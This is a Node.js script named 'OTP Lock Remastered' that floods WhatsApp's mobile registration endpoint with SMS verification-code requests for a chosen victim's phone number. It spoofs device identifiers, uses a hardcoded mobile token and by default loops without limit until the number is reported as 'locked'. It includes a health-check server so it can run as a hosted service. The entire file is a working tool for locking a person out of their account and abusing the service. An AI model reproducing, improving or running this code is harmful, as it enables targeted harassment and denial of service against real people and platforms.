const axios = require('axios');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
const http = require('http');
require('dotenv').config();

/**
 * OTP Lock Remastered
 * Standalone mimicry of the registration code flooding logic.
 */

const MOBILE_REGISTRATION_ENDPOINT = 'https://v.whatsapp.net/v2';
const MOBILE_USERAGENT = 'WhatsApp/2.22.24.81 iOS/15.3.1 Device/Apple-iPhone_7';

// Optional: Simple HTTP server for Render health checks
const PORT = process.env.PORT || 3000;
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('OTP Lock Remastered is running...\n');
});

function urlencode(str) {
    return str.replace(/-/g, '%2d').replace(/_/g, '%5f').replace(/~/g, '%7e');
}

function randomBase64Url(length) {
    return crypto.randomBytes(length).toString('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
}

function randomUrlHex(length) {
    const buffer = crypto.randomBytes(length);
    let result = '';
    buffer.forEach((x) => {
        result += `%${x.toString(16).padStart(2, '0').toLowerCase()}`;
    });
    return result;
}

async function requestOTP(cc, number, mobileToken, mcc, mnc) {
    const nationalNumber = number.replace(/[/-\s)(]/g, '').trim();

    const phoneId = uuidv4();
    const deviceId = Buffer.from(uuidv4().replace(/-/g, ''), 'hex').toString('base64')
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');

    const registrationId = crypto.randomInt(0, 2147483647);
    const e_regid = Buffer.alloc(4);
    e_regid.writeInt32BE(registrationId);

    const tokenSource = Buffer.concat([
        Buffer.from(mobileToken),
        Buffer.from(nationalNumber)
    ]);
    const token = crypto.createHash('md5').update(tokenSource).digest('hex');

    const params = {
        cc: cc,
        in: nationalNumber,
        Rc: '0',
        lg: 'en',
        lc: 'GB',
        mistyped: '6',
        authkey: randomBase64Url(32),
        e_regid: e_regid.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''),
        e_keytype: 'BQ',
        e_ident: randomBase64Url(32),
        e_skey_id: 'AAAA',
        e_skey_val: randomBase64Url(32),
        e_skey_sig: randomBase64Url(64),
        fdid: phoneId,
        network_ratio_type: '1',
        expid: deviceId,
        simnum: '1',
        hasinrc: '1',
        pid: crypto.randomInt(0, 1000).toString(),
        id: randomUrlHex(20),
        backup_token: randomUrlHex(20),
        token: token,
        mcc: mcc.padStart(3, '0'),
        mnc: mnc.padStart(3, '0'),
        sim_mcc: '000',
        sim_mnc: '000',
        method: 'sms',
        hasav: '1'
    };

    const queryString = Object.keys(params)
        .map(key => `${key}=${urlencode(params[key].toString())}`)
        .join('&');

    const url = `${MOBILE_REGISTRATION_ENDPOINT}/code?${queryString}`;

    console.log(`[${new Date().toISOString()}] Requesting OTP for +${cc}${nationalNumber}...`);

    try {
        const response = await axios.get(url, {
            headers: {
                'User-Agent': MOBILE_USERAGENT,
                'Accept': 'application/json'
            }
        });
        return response.data;
    } catch (error) {
        if (error.response && error.response.data) {
            return error.response.data;
        }
        throw error;
    }
}

async function start() {
    const cc = process.env.TARGET_CC;
    const number = process.env.TARGET_NUMBER;
    const mobileToken = process.env.MOBILE_TOKEN || '0a1mLfGUIBVrMKF1RdvLI5lkRBvof6vn0fD2QRSM4174c0243f5277a5d7720ce842cc4ae6';
    const delayMs = parseInt(process.env.DELAY_MS) || 10000;
    const maxRequests = parseInt(process.env.MAX_REQUESTS) || 0;
    const mcc = process.env.MCC || '724';
    const mnc = process.env.MNC || '001';

    if (!cc || !number) {
        console.error("Error: TARGET_CC and TARGET_NUMBER must be set in .env file or environment.");
        process.exit(1);
    }

    server.listen(PORT, () => {
        console.log(`Health check server listening on port ${PORT}`);
    });

    console.log("--- OTP Lock Remastered ---");
    console.log(`Target: +${cc} ${number}`);
    console.log(`MCC/MNC: ${mcc}/${mnc}`);
    console.log(`Delay: ${delayMs}ms`);
    console.log(`Max Requests: ${maxRequests === 0 ? 'Infinite' : maxRequests}`);
    console.log("---------------------------\n");

    let count = 0;
    const execute = async () => {
        if (maxRequests !== 0 && count >= maxRequests) {
            console.log("\nReached maximum number of requests.");
            return;
        }

        count++;
        try {
            const result = await requestOTP(cc, number, mobileToken, mcc, mnc);
            console.log(`Request #${count} Result:`, JSON.stringify(result));

            if (result.reason === 'temporarily_unavailable' || result.status === 'fail') {
                if (result.reason === 'temporarily_unavailable') {
                    console.log("Status: Target is now locked (temporarily_unavailable).");
                }
            }
        } catch (err) {
            console.error(`Request #${count} Error:`, err.message);
        }

        setTimeout(execute, delayMs);
    };

    execute();
}

start();
